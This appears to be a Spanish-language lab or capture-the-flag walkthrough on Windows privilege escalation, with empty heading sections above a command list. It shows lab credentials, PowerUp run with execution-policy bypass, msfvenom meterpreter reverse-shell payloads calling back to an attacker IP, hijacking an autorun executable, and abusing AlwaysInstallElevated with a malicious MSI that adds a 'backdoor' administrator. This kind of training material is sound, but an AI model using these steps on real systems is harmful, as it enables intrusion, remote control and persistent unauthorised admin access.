## Objetivo
## Pistas
## Solución

```


username: user
password: password321
net user
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\Autorun Program”
— w : only show the items that have write access.
— u : ignore/supress the errors.
— v : for verbosity.
powershell -ep bypass. .\PowerUP.ps1

Invoke-AllChecks

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.6.9.56 -f exe -o program.exe

msfconsole -q
use multi/handler
set payload/windows/meterpreter/reverse_tcp
set lhost <IP_of_tunnel>

sudo python3 -m http.server 80

Hacer clic en program.exe y guárdelo en “C:\Program Files\Autorun Program”
Como ya existe un archivo llamado program.exe, reemplazar

Ahora, necesitamos iniciar nuestro receptor.

vamos a la terminal msfconsole y escribe run para iniciar el receptor.
En nuestra máquina víctima, cerraremos sesión y volveremos a iniciarla, para que se ejecute nuestro programa de ejecución automática.
Esta vez, usemos las otras credenciales proporcionadas allí.
Una vez que hayamos iniciado sesión, nos aparecerá una ventana para ejecutar nuestro programa.exe.
clic en Ejecutar.
Regresa a tu msfconsole, tenemos una sesión de meterpreter.
Ejecuta:
getuid


////

habremos el cmd del sistema y se escribe:
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

reg query HKCU\Software\Policies\Microsoft\Windows\Installer

Write-UserAddMSI

Ahora, veamos los administradores del sistema:

Ejecutar:
net local group administrators

Ahora, ejecutemos ese programa msi malicioso.

doble clic en el programa para iniciar la instalación. Aparecerá un menú para crear un usuario. Simplemente haga clic en crear.

Creó un usuario llamado backdoor y lo agregó al grupo de administradores, lo que significa que uno puede iniciar sesión en la cuenta y tener acceso de administrador.

Este fue un método, ahora probemos el método mencionado en la tarea:

Ejecute este comando para generar una nueva carga útil.
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Dirección IP de la máquina virtual Kali/Parrot] -f msi -o setup.msi
Mueva esta payload a un directorio separado e inicie el servidor Python en el puerto 80.
otra terminal y ejecutar metasploit:
- msfconsole
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set lhost [Kali/Parrot VM IP Address]
- run

A la máquina víctima. Abrir Internet Explorer y busca la IP del atacante.
Haga clic en setup.msi y luego en Ejecutar.
En msfconsole, se puede ver que tenemos una sesión de meterpreter.

Type:
getuid

exploit/windows/local/always_install_elevated





```
## Notas adicionales
## Referencias